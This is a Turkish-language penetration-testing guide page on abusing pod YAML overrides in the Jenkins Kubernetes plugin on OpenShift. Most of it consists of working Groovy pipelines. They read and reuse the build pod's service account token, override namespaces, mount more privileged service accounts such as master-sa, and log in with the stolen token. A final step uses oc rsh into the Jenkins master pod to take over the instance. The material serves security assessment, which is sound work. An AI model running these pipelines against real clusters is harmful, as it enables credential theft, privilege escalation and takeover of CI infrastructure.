# Jenkins in Openshift - build pod overrides

**Bu sayfanın orijinal yazarı** [**Fares**](https://www.linkedin.com/in/fares-siala/)

## Kubernetes plugin for Jenkins
Bu eklenti, openshift/kubernetes kümesindeki Jenkins çekirdek işlevlerinden çoğunlukla sorumludur. Resmi belgeler [burada](https://plugins.jenkins.io/kubernetes/) 
Geliştiricilerin bir jenkins build pod'unun bazı varsayılan yapılandırmalarını geçersiz kılma yeteneği gibi birkaç işlevsellik sunar.

## Core functionnality

Bu eklenti, geliştiricilere kodlarını uygun bir ortamda inşa ederken esneklik sağlar.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: maven
image: maven:3.8.1-jdk-8
command:
- sleep
args:
- 99d
''') {
node(POD_LABEL) {
stage('Get a Maven project') {
git 'https://github.com/jenkinsci/kubernetes-plugin.git'
container('maven') {
stage('Build a Maven project') {
sh 'mvn -B -ntp clean install'
}
}
}
}
}
```
## Bazı kötüye kullanımlar pod yaml override kullanarak

Ancak, erişilebilir herhangi bir görüntüyü kullanmak için kötüye kullanılabilir, örneğin Kali Linux ve o görüntüden önceden yüklenmiş araçları kullanarak keyfi komutlar çalıştırmak. Aşağıdaki örnekte, çalışan pod'un serviceaccount token'ını dışarı aktarabiliriz.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: kali
image: myregistry/mykali_image:1.0
command:
- sleep
args:
- 1d
''') {
node(POD_LABEL) {
stage('Evil build') {
container('kali') {
stage('Extract openshift token') {
sh 'cat /run/secrets/kubernetes.io/serviceaccount/token'
}
}
}
}
}
```
Aynı amaca ulaşmak için farklı bir sözdizimi.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Pod'un ad alanını geçersiz kılmak için örnek
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: RANDOM-NAMESPACE
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Başka bir örnek, adını temel alarak (build'inizi çalıştıran varsayılan olandan daha fazla izinlere sahip olabilecek) bir serviceaccount'u monte etmeye çalışır. Öncelikle mevcut serviceaccount'ları tahmin etmeniz veya saymanız gerekebilir.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: MY_SERVICE_ACCOUNT
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Aynı teknik, bir Secret'ı monte etmeye çalışmak için de geçerlidir. Buradaki nihai hedef, pod yapınızı etkili bir şekilde pivotlamak veya ayrıcalık kazanmak için nasıl yapılandıracağınızı bulmaktır.

## Daha ileri gitmek

Buna alıştığınızda, Jenkins ve Kubernetes/Openshift hakkındaki bilginizi kullanarak yanlış yapılandırmaları / kötüye kullanımları bulmaya çalışın.

Kendinize şu soruları sorun:

- Hangi hizmet hesabı build pod'larını dağıtmak için kullanılıyor?
- Hangi roller ve izinlere sahip? Şu anda bulunduğum namespace'in secret'larını okuyabilir mi?
- Diğer build pod'larını daha fazla listeleyebilir miyim?
- Kompromize olmuş bir sa'dan master node/pod üzerinde komut çalıştırabilir miyim?
- Küme üzerinde daha fazla listeleme yaparak başka bir yere pivotlayabilir miyim?
- Hangi SCC uygulanıyor?

Hangi oc/kubectl komutlarını vermeniz gerektiğini [buradan](../openshift-basic-information.md) ve [buradan](../../kubernetes-security/kubernetes-enumeration.md) öğrenebilirsiniz.

### Olası privesc/pivoting senaryoları

Değerlendirmeniz sırasında tüm jenkins build'lerinin _worker-ns_ adlı bir namespace içinde çalıştığını keşfettiğinizi varsayalım. _default-sa_ adlı varsayılan bir hizmet hesabının build pod'larına monte edildiğini, ancak bazı kaynaklar üzerinde yalnızca okuma erişimi dışında çok fazla izni olmadığını belirlediniz, ancak _master-sa_ adlı mevcut bir hizmet hesabını tanımlayabildiniz.
Ayrıca, çalışan build konteyneri içinde oc komutunun yüklü olduğunu varsayalım.

Aşağıdaki build script'i ile _master-sa_ hizmet hesabını kontrol altına alabilir ve daha fazla listeleme yapabilirsiniz.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: master-sa
containers:
- name: evil
image: random_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
sh 'token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)'
sh 'oc --token=$token whoami'
}
}
}
}
}
}
```
Erişiminize bağlı olarak, ya saldırınıza build script'ten devam etmeniz gerekiyor ya da bu sa ile çalışan kümede doğrudan giriş yapabilirsiniz:
```bash
oc login --token=$token --server=https://apiserver.com:port
```
Eğer bu sa'nın yeterli izni varsa (örneğin pod/exec), aynı isim alanında çalışıyorsa, master node pod'u içinde komutlar çalıştırarak tüm jenkins örneğini kontrol altına alabilirsiniz. Bu pod'u adı ve jenkins verilerini depolamak için kullanılan bir PVC (persistant volume claim) monte etmesi gerektiği gerçeği ile kolayca tanımlayabilirsiniz.
```bash
oc rsh pod_name -c container_name
```
Eğer master node pod'u, worker'lar ile aynı namespace içinde çalışmıyorsa, master namespace'i hedef alarak benzer saldırılar deneyebilirsiniz. Bunun _jenkins-master_ olarak adlandırıldığını varsayalım. serviceAccount master-sa'nın _jenkins-master_ namespace'inde mevcut olması gerektiğini unutmayın (ve _worker-ns_ namespace'inde mevcut olmayabilir).
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: jenkins-master
spec:
serviceAccount: master-sa
containers:
- name: evil-build
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
